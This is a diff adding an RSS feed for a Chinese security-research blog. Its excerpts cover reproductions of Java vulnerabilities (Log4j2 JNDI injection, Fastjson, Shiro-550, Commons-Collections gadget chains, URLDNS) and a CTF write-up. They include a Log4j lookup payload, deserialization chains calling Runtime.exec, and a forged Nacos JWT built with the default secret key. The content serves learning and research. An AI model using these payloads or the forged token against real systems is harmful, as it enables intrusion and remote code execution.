@@ -1,0 +1,255 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>n2ryx on n2ryx&#39;s Blog</title>
+    <link>https://n2ryx.github.io/authors/n2ryx/</link>
+    <description>Recent content in n2ryx on n2ryx&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 20 Mar 2024 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://n2ryx.github.io/authors/n2ryx/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Log4j2(CVE-2021-44228)</title>
+      <link>https://n2ryx.github.io/docs/java/vulrecurrent/log4j2cve-2021-44228/</link>
+      <pubDate>Wed, 20 Mar 2024 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/vulrecurrent/log4j2cve-2021-44228/</guid>
+      <description>Log4j2(CVE-2021-44228) 漏洞概述 Log4j2在处理消息转换时，会按照字符检测每条日志，当日志中包含${}时，则会将表达式的内容替换成真实的内容(即lookup接口查找得到的内容），使用LDAP或RMI协议，能从远程服务区上请求恶意的对象，对象在调用的过程中会被解析执行，导致了Log4j2的漏洞
+影响版本
+Apache Log4j 2.x &amp;lt;= 2.14.1
+Log4j2依赖
+&amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;log4j-core&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;log4j-api&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; DNSLog
+import org.apache.logging.log4j.Logger; import org.apache.logging.log4j.LogManager; public class Log4j2 { private static final Logger logger = LogManager.getLogger(Log4j2.class); public static void main(String[] args) { logger.error(&amp;#34;${jndi:ldap://${sys:java.version}.hzitqenuvp.dgrh3.cn}&amp;#34;); } } Java版本信息呈现
+漏洞原理 调用堆栈：
+LOGGER.error……MessagePatternConverter.format……StrSubstitutor.resolveVariableInterpolator.lookupJndiLookup.lookupJndiManager.lookupInitialContext.lookup MessagePatternConverter.format()
+DNSLog代码中的LOGGER.error()方法最终会调用到MessagePatternConverter.format()方法，该方法对日志内容进行解析和格式化，并返回最终格式化后的日志内容。当碰到日志内容中包含${子串时，调用StrSubstitutor进行进一步解析
+StrSubstitutor.resolveVariable()
+StrSubstitutor将${和}之间的内容提取出来，调用并传递给Interpolator.lookup()方法，实现Lookup功能
+Interpolator.lookup()
+Interpolator实际是一个实现Lookup功能的代理类，该类在成员变量strLookupMap中保存着各类Lookup功能的真正实现类。Interpolator对 上一步提取出的内容解析后，从strLookupMap获得Lookup功能实现类，并调用实现类的lookup()方法
+JndiLookup.lookup()
+JndiLookup.lookup()方法调用JndiManager.lookup()方法，获取JNDI对象后，调用该对象上的toString()方法，最终返回该字符串
+JndiManager.lookup()
+直接委托给InitialContext.lookup()方法
+后续便是常规的JNDI注入路径进行分析
+JNDI+RMI Log4j2.</description>
+    </item>
+    <item>
+      <title>Fastjson1.2.24(CVE-2017-18349)</title>
+      <link>https://n2ryx.github.io/docs/java/vulrecurrent/fastjson1.2.24cve-2017-18349/</link>
+      <pubDate>Sat, 02 Mar 2024 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/vulrecurrent/fastjson1.2.24cve-2017-18349/</guid>
+      <description>Fastjson1.2.24(CVE-2017-18349) 概述 Fastjson是一个Java语言编写的高性能功能完善的JSON库。它采用一种“直接反序列化”的方式将JSON转换成Java对象，或者将Java对象转换成JSON。
+序列化和反序列化 对于Fastjson来讲，并不是所有的Java对象都能被转为JSON，只有Java Bean格式的对象才能Fastjson被转为JSON。
+Fastjson提供了两个主要接口来分别实现对于Java Object的序列化和反序列化操作：
+JSON.toJSONString JSON.parseObject/JSON.parse 反序列化时不指定特定的类，那么Fastjson就默认将一个JSON字符串反序列化为一个JSONObject。需要注意的是，对于类中private类型的属性值，Fastjson默认不会将其序列化和反序列化。
+Fastjson中的@type 使用Fastjson序列化对象的时候，如果toJSONString()方法不添加额外的属性，那么就会将一个Java Bean转换成JSON字符串。
+{&amp;#34;age&amp;#34;:18,&amp;#34;name&amp;#34;:&amp;#34;Faster&amp;#34;} 如果想把JSON字符串反序列化成Java Object，可以使用parse()方法。该方法默认将JSON字符串反序列化为一个JSONObject对象。
+com.alibaba.fastjson.JSONObject{&amp;#34;name&amp;#34;:&amp;#34;Faster&amp;#34;,&amp;#34;age&amp;#34;:18} 将JSON字符串反序列化为原始的类（两种） 序列化的时候，在toJSONString()方法中添加额外的属性SerializerFeature.WriteClassName，将对象类型一并序列化： Person person = new Person(&amp;#34;Faster&amp;#34;,18); //序列化时添加额外属性 String jsonType = JSON.toJSONString(person, SerializerFeature.WriteClassName); System.out.println(type); 输出，Fastjson在JSON字符串中添加了一个@type字段，用于标识对象所属的类 {&amp;#34;@type&amp;#34;:&amp;#34;fastjson.Person&amp;#34;,&amp;#34;age&amp;#34;:18,&amp;#34;name&amp;#34;:&amp;#34;Faster&amp;#34;} 在反序列化该JSON字符串的时候，parse()方法就会根据@type标识将其转为原来的类。
+String jsonText = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;Person\&amp;#34;,\&amp;#34;age\&amp;#34;:18,\&amp;#34;name\&amp;#34;:\&amp;#34;Faster\&amp;#34;}&amp;#34;; System.out.println(JSON.parse(jsonText)); //结果如下 Person@4459eb14 反序列化的时候，在parseObject()方法中手动指定对象的类型 bject o3 = JSON.parseObject(jsonText,Person.class); System.out.println(o3.getClass().getName()); System.out.println(o3); //输出 fastjson.Person fastjson.Person@1e6d1014 Fastjson分析 序列化：toJSONString()方法实际是通过调用getter来获取对象的属性值的，根据这些属性值来生成JSON字符串。
+反序列化：parse()先调用@type标识的类的构造函数，然后再调用setter给对象赋值；parseObject()方法会同时调用setter和getter。
+源码分析
+DefaultJSONParser#parseObject方法中，通过scanSymbol()方法来解析出表示符 @type
+反射加载@type
+反射加载的类的时候会对类进行黑名单检查，黑名单中有Thread类
+然后会在反射获取的方法中循环遍历寻找特定的setter和getter。条件如下：
+方法名长度大于4且以set开头，且第四个字母要是大写 非静态方法 返回类型为void或当前类 参数个数为1个 Fastjson反序列化漏洞 fastjson依赖
+&amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;fastjson&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.</description>
+    </item>
+    <item>
+      <title>JNDI</title>
+      <link>https://n2ryx.github.io/docs/java/javagadget/jndi/</link>
+      <pubDate>Thu, 29 Feb 2024 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/javagadget/jndi/</guid>
+      <description>JNDI 概述 JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一种标准的Java命名系统接口。JNDI提供统一的客户端API，并由管理者将JNDI API映射为特定的命名服务和目录服务，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。简单来说，开发人员通过合理的使用JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务。如下图所示
+命名服务（Naming Server） 命名服务，简单来说，就是一种通过名称来查找实际对象的服务。比如我们的RMI协议，可以通过名称来查找并调用具体的远程对象。再比如我们的DNS协议，通过域名来查找具体的IP地址。这些都可以叫做命名服务。
+在命名服务中，有几个重要的概念。
+Bindings：表示一个名称和对应对象的绑定关系，比如在在 DNS 中域名绑定到对应的 IP，在RMI中远程对象绑定到对应的name,文件系统中文件名绑定到对应的文件。 Context：上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (SubContext)。 References：在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C/C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。 目录服务（Directory Service） 简单来说，目录服务是命名服务的扩展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性（Attributes）信息。由此，我们不仅可以根据名称去查找（Lookup）对象(并获取其对应属性)，还可以根据属性值去搜索（Search）对象。
+一些常见的目录服务有：
+LDAP： 轻型目录访问协议 Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等； 其他基于 X.500 (目录服务的标准) 实现的目录服务； JNDI注入 lookup()函数的访问地址参数控制不当，则有可能导致加载远程恶意类。JNDI接口可以调用多个含有远程功能的服务，所以我们的攻击方式也多种多样。但流程大同小异，如下图所示
+JNDI+RMI 通过RMI进行JNDI注入，攻击者构造的恶意RMI服务器向客户端返回一个Reference对象，Reference对象中指定从远程加载构造的恶意Factory类，客户端在进行lookup的时候，会从远程动态加载攻击者构造的恶意Factory类并实例化，攻击者可以在构造方法或者是静态代码等地方加入恶意代码。
+javax.naming.Reference构造方法为：Reference(String className, String factory, String factoryLocation)，
+className - 远程加载时所使用的类名 classFactory - 加载的class中需要实例化类的名称 classFactoryLocation - 提供classes数据的地址可以是file/ftp/http等协议 因为Reference没有实现Remote接口也没有继承UnicastRemoteObject类，故不能作为远程对象bind到注册中心，所以需要使用ReferenceWrapper对Reference的实例进行一个封装。
+test.java
+恶意代码（test.class），将其编译好放到可访问的http服务下(python -m http.server)
+// 不能放在任何包下 import java.io.IOException; public class test { public test() throws IOException { Runtime.</description>
+    </item>
+    <item>
+      <title>RMI</title>
+      <link>https://n2ryx.github.io/docs/java/javagadget/rmi/</link>
+      <pubDate>Fri, 26 Jan 2024 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/javagadget/rmi/</guid>
+      <description>RMI 概述 RMI（Remote Method Invocation）是计算机之间通过网络实现对象调用的一种通讯机制。它允许在Java虚拟机（JVM）之间进行通信，使得在一个JVM中的对象可以调用另一个JVM中的对象的方法，就像这些对象都在同一个JVM中一样。
+服务端（Server）：
+服务端创建一个远程对象，并实现一个或多个远程接口。 服务端启动 RMI 注册表，并将远程对象绑定到注册表中。 客户端（Client）：
+客户端从 RMI 注册表中查找所需的远程对象。 客户端获取远程对象的引用，并调用其方法。 测试环境：JDK8u41
+RMIServer.java
+import java.rmi.Naming; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.UnicastRemoteObject; public class RMIServer { // 接口 public interface IRemoteObj extends Remote { public String hello(String para) throws RemoteException; } public class RemoteObjImpl extends UnicastRemoteObject implements IRemoteObj { protected RemoteObjImpl() throws RemoteException { super(); } public String hello(String para) throws RemoteException { System.</description>
+    </item>
+    <item>
+      <title>2023CISCN初赛题目复现</title>
+      <link>https://n2ryx.github.io/docs/java/ctf/2023ciscn%E5%88%9D%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Sat, 20 Jan 2024 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/ctf/2023ciscn%E5%88%9D%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</guid>
+      <description>2023CISCN初赛题目复现 Unzip 题型：文件上传（软连接）
+点击上传，跳转到upload.php，高亮源码
+软连接
+依次上传 1.zip、2.zip
+BackendService 题型：nacos身份认证漏洞+Nacos结合Spring Cloud Gateway RCE利用
+nacos身份认证漏洞 这里用的 QVD-2023-6271 nacos token.secret.key身份认证绕过漏洞
+影响版本：0.1.0&amp;lt;= Nacos&amp;lt;= 2.2.0
+默认密钥
+SecretKey012345678901234567890123456789012345678901234567890123456789 exp为时间戳，大于当前时间即可
+发送到重放模块，添加Authorization: Bearer
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MjU1NjAyODgwMH0.qortgrr-UfhqQ-G9AWstQO-azRecm_b84uonXmYDMqo 登入系统
+Nacos结合Spring Cloud Gateway RCE利用 该漏洞在网上公开POC的利用方式是通过/actuator/gateway/routes这个节点进行动态添加路由的，当项目配置文件中配置了以下两行配置时（YAML格式），便会开启该接口：
+## application.yaml management.endpoint.gateway.enabled: true # default value management.endpoints.web.exposure.include: gateway 题目中的backcfg服务节点（就是nacos服务本身，两者是同一个机器）加载配置文件的话就可以在控制台创建backcfg.json配置，之后backcfg服务节点就会自动导入配置。Nacos结合Spring Cloud Gateway RCE利用配置文件gateway，如果发现应用未开启Actuator，则结合前文所说的利用响应包增加Header的方式回显，将配置在Nacos中进行修改
+spring: cloud: gateway: routes: - id: exam order: 0 uri: lb://service-provider predicates: - Path=/echo/** filters: - name: AddResponseHeader args: name: result value: &amp;#34;#{new java.</description>
+    </item>
+    <item>
+      <title>Shiro-550(CVE-2016-4437)</title>
+      <link>https://n2ryx.github.io/docs/java/vulrecurrent/shiro-550cve-2016-4437/</link>
+      <pubDate>Tue, 12 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/vulrecurrent/shiro-550cve-2016-4437/</guid>
+      <description>Shiro-550(CVE-2016-4437) 概述 Apache Shiro是一个强大且易用的Java安全框架，提供了认证、授权、会话管理、加密等功能。
+环境搭建 Shiro1.2.4：https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4
+编辑 shiro/web 目录下的 pom.xml，将 jstl 的版本修改为1.2
+&amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;javax.servlet&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;jstl&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.2&amp;lt;/version&amp;gt; &amp;lt;scope&amp;gt;runtime&amp;lt;/scope&amp;gt; &amp;lt;/dependency&amp;gt; IDEA导入 mvn 项目，配置 tomcat 环境
+漏洞分析 根据漏洞描述，Shiro≤1.2.4 版本默认使用 CookieRememberMeManager，当获取用户请求时，大致的关键处理过程如下：
+获取Cookie中rememberMe的值 对rememberMe进行Base64解码 使用AES进行解密 对解密的值进行反序列化 由于AES加密的Key是硬编码的默认Key，因此攻击者可通过使用默认的Key对恶意构造的序列化数据进行加密，当 CookieRememberMeManager 对恶意的 rememberMe 进行以上过程处理时，最终会对恶意数据进行反序列化，从而导致反序列化漏洞
+抓包分析 勾选 Remember Me
+服务器会返回一个 rememberMe Cookie
+之后的请求也会带上这个Cookie
+源码分析 查找 Cookie 相关操作类
+CookieRememberMeManager 类里有序列化和get序列化的方法
+getRememberedSerializedIdentity() 查找调用
+convertBytesToPrincipals() 执行解密和反序列化
+deserialize() [DefaultSerializer类中]
+解密分析 decrypt()
+接口
+找到 decryptionCipherKey 赋值的地方
+常量 decryptionCipherKey
+加密分析 convertPrincipalsToBytes()
+encrypt()
+可以知道加密算法为 AES的CBC模式
+加解密脚本</description>
+    </item>
+    <item>
+      <title>commons-collections</title>
+      <link>https://n2ryx.github.io/docs/java/javagadget/commons-collections/</link>
+      <pubDate>Thu, 30 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/javagadget/commons-collections/</guid>
+      <description>CC chain CC1_LazyMap import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC1_LazyMap { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&amp;#34;getMethod&amp;#34;,new Class[]{String.class,Class[].class},new Object[]{&amp;#34;getRuntime&amp;#34;,null}), new InvokerTransformer(&amp;#34;invoke&amp;#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(&amp;#34;exec&amp;#34;,new Class[]{String.class},new Object[]{&amp;#34;calc&amp;#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&amp;lt;Object,Object&amp;gt; map = new HashMap&amp;lt;&amp;gt;(); Map&amp;lt;Object,Object&amp;gt; lazyMap = LazyMap.</description>
+    </item>
+    <item>
+      <title>CC3</title>
+      <link>https://n2ryx.github.io/docs/java/javagadget/cc3/</link>
+      <pubDate>Mon, 20 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/javagadget/cc3/</guid>
+      <description>CC3 ClassLoader defineClass() TemplatesImpl defineClass() default，本类调用
+defineTransletClasses() private，继续找
+父类是 ABSTRACT_TRANSLET 常量就赋一个值；否则会用 put 方法，_auxClasses 为空，就会报空指针错误
+getTransletInstance() newInstance()，初始化后，可以动态执行代码
+newTransformer() public
+CC3_Test package Gadget.CC3; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.Base64; public class CC3_Test { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(&amp;#34;_name&amp;#34;); nameField.setAccessible(true); nameField.set(templates,&amp;#34;aaa&amp;#34;); Field byteCodesField = tc.getDeclaredField(&amp;#34;_bytecodes&amp;#34;); byteCodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(&amp;#34;E:\\Compiler\\Idea\\target\\classes\\xyz\\Gadget\\CC3\\Test.class&amp;#34;)); // byte[] code = Base64.</description>
+    </item>
+    <item>
+      <title>CC6</title>
+      <link>https://n2ryx.github.io/docs/java/javagadget/cc6/</link>
+      <pubDate>Fri, 17 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/javagadget/cc6/</guid>
+      <description>CC6 Gadget chain /* Gadget chain: java.io.ObjectInputStream.readObject() java.util.HashSet.readObject() java.util.HashMap.put() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() From： ysoserial */ 后面跟CC1一样，关注变化
+TiedMapEntry hashCode() getValue() 利用成：LazyMap.get()
+构造方法
+运行会发现，在序列化的时候就会触发
+package Gadget.CC6; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.util.HashMap; import java.util.Map; public class CC6_Test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&amp;#34;getMethod&amp;#34;, new Class[]{String.class, Class[].</description>
+    </item>
+    <item>
+      <title>CC1-LazyMap</title>
+      <link>https://n2ryx.github.io/docs/java/javagadget/cc1-lazymap/</link>
+      <pubDate>Wed, 15 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/javagadget/cc1-lazymap/</guid>
+      <description>CC1-LazyMap Gadget chain /* Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() From: ysoserial */ 后面还是用 InvokerTransformer，这个类完成任意命令执行的操作，分析一下改变的地方
+LazyMap.get() 也是查找哪里调用了 transform()，map 里没有 key 才能执行到 transform()
+构造方法 类型为 protected
+decorate 利用这个方法完成赋值
+调 get() 有点多，直接看 chain
+AnnotationInvocationHandler.invoke() chain: AnnotationInvocationHandler.invoke()，代理对象的方法被调用时由Java运行时系统隐式地调用invoke方法
+第一个 if 判断方法是 equals 返回 equalsImpl，第二个 if 判断参数不等于 0；绕过if ，不为 equals 的无参函数
+需要执行到 get()
+AnnotationInvocationHandler构造方法 入口类也是它，会用到构造方法
+Map(Proxy).entrySet() 不满足 invoke() 里的连个 if 条件，可以执行到 get()
+Proxy.newProxyInstance 创建动态代理，简单看一下形参，利用这个主要是调用 invoke()</description>
+    </item>
+    <item>
+      <title>CC1-TransformedMap</title>
+      <link>https://n2ryx.github.io/docs/java/javagadget/cc1-transformedmap/</link>
+      <pubDate>Sun, 12 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/javagadget/cc1-transformedmap/</guid>
+      <description>CC1-TransformedMap CC1链对JDK版本有要求，需在8u71之前
+Jdk1.8.0.65: https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html
+sun包: https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 src\share\classes\sun，放到Jdk下解压的src包内，Idea添加
+导入maven依赖（pom.xml）
+Transformer-执行类 主要利用方法 Transform()，看那些类实现了这个类
+查找用法，找到调用 transformer 的方法
+寻找调用链 InvokerTransformer InvokerTransformer构造函数控制参数，tranform() 可以执行任意命令
+// InvokerTransformer package Gadget.CC1; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.reflect.Method; public class CC1_1 { public static void main(String[] args) throws Exception { // Runtime正常执行 // Runtime.getRuntime().exec(&amp;#34;calc&amp;#34;); // Runtime反射执行 // Runtime r = Runtime.getRuntime(); // Class c = Runtime.class; // Method m = c.getMethod(&amp;#34;exec&amp;#34;,String.class); // m.invoke(r,&amp;#34;calc&amp;#34;); // InvokerTransformer.transform()实现 new InvokerTransformer(&amp;#34;exec&amp;#34;,new Class[]{String.class},new Object[]{&amp;#34;calc&amp;#34;}).transform(Runtime.getRuntime()); } } TransformedMap 进入到 InvokerTransformer类里，查看 Transform 的用法，找 TransformedMap</description>
+    </item>
+    <item>
+      <title>URLDNS</title>
+      <link>https://n2ryx.github.io/docs/java/javagadget/urldns/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/javagadget/urldns/</guid>
+      <description>URLDNS ysoserial 分析 ysoserial 生成 URLDNS 代码
+@SuppressWarnings({ &amp;#34;rawtypes&amp;#34;, &amp;#34;unchecked&amp;#34; }) @PayloadTest(skip = &amp;#34;true&amp;#34;) @Dependencies() @Authors({ Authors.GEBL }) public class URLDNS implements ObjectPayload&amp;lt;Object&amp;gt; { public Object getObject(final String url) throws Exception { // 在创建负载期间避免DNS解析 // 由于字段 java.net.URL.handler 是瞬态的，因此它不会是序列化负载的一部分 URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap将包含URL URL u = new URL(null, url, handler); // 用作密钥的URL ht.put(u, url); // 该值可以是任何可序列化的值，URL作为触发DNS查找的关键字 Reflections.setFieldValue(u, &amp;#34;hashCode&amp;#34;, -1); // 在上面的put过程中，计算并缓存URL的hashCode。这会重置它，以便下次调用hashCode时将触发DNS查找 return ht; } public static void main(final String[] args) throws Exception { PayloadRunner.</description>
+    </item>
+    <item>
+      <title>WebGoat-Java反序列化</title>
+      <link>https://n2ryx.github.io/docs/java/javabase/webgoat-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
+      <pubDate>Fri, 10 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/javabase/webgoat-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
+      <description>WebGoat-Java反序列化 源项目：webgoat-server-8.2.2（https://github.com/WebGoat/WebGoat/releases）
+Jdk：&amp;gt;=15（11不行）
+启动命令：
+java -jar webgoat-server-8.2.2.jar http://127.0.0.1:8080/WebGoat/login
+题目java文件：webgoat-server-8.2.2.jar 解包，webgoat-server-8.2.2/BOOT-INF/lib/insecure-deserialization-8.2.2.jar再次解包，org/org.owasp.webgoat.deserialization下的文件
+分析源码 // InsecureDeserializationTask package org.owasp.webgoat.deserialization; import java.io.ByteArrayInputStream; import java.io.IOException; import java.io.InvalidClassException; import java.io.ObjectInputStream; import java.util.Base64; import org.dummy.insecure.framework.VulnerableTaskHolder; import org.owasp.webgoat.assignments.AssignmentEndpoint; import org.owasp.webgoat.assignments.AssignmentHints; import org.owasp.webgoat.assignments.AttackResult; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.ResponseBody; import org.springframework.web.bind.annotation.RestController; @RestController @AssignmentHints({&amp;#34;insecure-deserialization.hints.1&amp;#34;, &amp;#34;insecure-deserialization.hints.2&amp;#34;, &amp;#34;insecure-deserialization.hints.3&amp;#34;}) public class InsecureDeserializationTask extends AssignmentEndpoint { public InsecureDeserializationTask() { } @PostMapping({&amp;#34;/InsecureDeserialization/task&amp;#34;}) @ResponseBody public AttackResult completed(@RequestParam String token) throws IOException { String b64token = token.replace(&amp;#39;-&amp;#39;, &amp;#39;+&amp;#39;).replace(&amp;#39;_&amp;#39;, &amp;#39;/&amp;#39;); long before; long after; try { label71: { // base64解码，通过字节流反序列化对象 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.</description>
+    </item>
+    <item>
+      <title>Java反序列化原理</title>
+      <link>https://n2ryx.github.io/docs/java/javabase/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/</link>
+      <pubDate>Tue, 17 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/javabase/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/</guid>
+      <description>Java反序列化原理 Serializable 接口的使用 类需要被序列化和反序列化，需要实现接口 java.io.Serializable
+Java 提供的序列化接口 Serializable ，是一个空接口，没有成员方法和变量
+public interface Serializable { } import java.io.Serializable; public class Example implements Serializable{ private String name; .... } 序列化 调用 ObjectOutputStream 类的 writeObject 方法
+反序列化 调用 ObjectInputStream 类的 readObject 方法
+注意：
+只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列，否则会抛出异常。Externalizable 接口继承自Serializable接口，实现 Externalizable接口的类完全由自身来控制序列化的行为，而仅实现 Serializable 接口的类可以采用默认的序列化方式。
+它是Java 提供的序列化接口，是一个空接口，没有成员方法和变量 一个类要想序列化就必须继承java.io.Serializable接口，同时它的子类也可以序列化（不用再继承Serializable接口） 一个实现Serializable 接口的子类也是可以被序列化的。在反序列化过程中，它的父类如果没有实现序列化接口，那么父类将需要提供无参构造函数来重新创建对象，这样做的目的是重新初始化父类的属性，父类对应的属性不会被序列化 序列化只能保存对象的非静态成员变量，不能保存任何的成员方法和静态的成员变量，而且序列化保存的只是变量的值，对于变量的任何修饰符都不能保存。即序列化是保存对象的状态（对象属性） transient 标识的对象成员变量不参与序列化 Serializable 在序列化和反序列化过程中大量使用了反射，因此其过程会产生的大量的内存碎片 **注：**JAVA会被称为八股文，原因在于它的一个小知识点里会有很多细节在里面
+Person package net.Seck2y.a01; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; public class Person implements Serializable { private String name; private int age; public Person() {} public Person(String name, int age) { this.</description>
+    </item>
+    <item>
+      <title>Java反射&amp;动态代理</title>
+      <link>https://n2ryx.github.io/docs/java/javabase/java%E5%8F%8D%E5%B0%84%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</link>
+      <pubDate>Fri, 13 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/javabase/java%E5%8F%8D%E5%B0%84%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</guid>
+      <description>Java反射&amp;amp;动态代理 反射机制 Java 反射（Reflection）是一种机制，它允许 Java 程序在运行时获取和操作它本身的数据结构，比如类、方法、属性等。通过反射，我们可以动态地创建对象、调用方法、访问属性等，而无需在编译时知道这些信息。
+Java 反射主要包括以下几个核心类：
+Class 类：表示一个类或接口，包含了获取类信息的方法，如获取类名、父类、接口、属性、方法等。 Constructor 类：表示一个构造函数，包含了获取构造函数信息的方法，如获取构造函数名、参数列表等。 Field 类：表示一个属性，包含了获取属性信息的方法，如获取属性名、类型、访问权限等。 Method 类：表示一个方法，包含了获取方法信息的方法，如获取方法名、参数列表、返回类型等。 以下是一些 Java 反射的常见用法：
